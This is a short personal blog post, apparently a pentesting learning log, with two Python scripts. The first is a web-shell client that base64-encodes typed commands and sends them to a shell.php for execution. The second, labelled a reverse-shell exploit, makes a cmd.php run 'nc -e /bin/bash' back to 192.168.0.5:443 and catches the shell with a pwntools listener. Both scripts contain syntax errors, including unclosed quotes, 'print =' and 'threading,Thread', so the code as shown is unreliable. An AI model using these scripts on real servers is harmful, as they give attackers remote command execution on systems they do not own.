---
title: PythonScripting
published: true
---
<p><font color="yellow">[<font color="red">*</font>]</font><font color="lime"> sáb 26 nov 2022</font></p>
<p><center><font color="green">Shell Simulation, With Base64 Requests</font></center></p>

<b>

```python

	import requests 
	import time, signal, sys
	from base64 import b64encode
	def salida(sig,frame):
		print('\n saliendo\n')
		sys.exit(1)

	signal.signal(signal.SIGINT, salida)

	while True:
		command = input('\n shell : )
		command = command.encode('utf-8)
		command = b64encode(command).decode('utf-8')

		data = {
			'cmd' : 'echo %s | base64 -d | bash' % (command)
			
		}

		request = requests.get('http://localhost/shell.php', params=data, timeout=5).text

		print = ('\n', request)

```
<br>
<p><font color="yellow">[<font color="red">*</font>]</font><font color="lime"> dom 27 nov 2022</font></p>
<br>

<p><center><font color="green">Exploit python3 reverseShell</font></center></p>

```python

#!/usr/bin/python3

import requests
import signal
import threading
import sys
from pwn import *

def salida(sig, frame):
	print('\n\n[!] Saliendo .. \n')
	sys.exit(1)

signal.signal(signal.SIGINT, salida)
if __name__ == '__main__' : 

	def exploit():
		url = 'http://localhost/cmd.php'
		data = {
			'cmd' : 'nc -e /bin/bash 192.168.0.5 443'
		}
		requests.get(url, params=data)
	
	try:
		threading,Thread(target=exploit).start()
	except Exception as e:
		print()
		
	port= 443	
	shell = listen(port).wait_for_connection()
	shell.interactive()


```
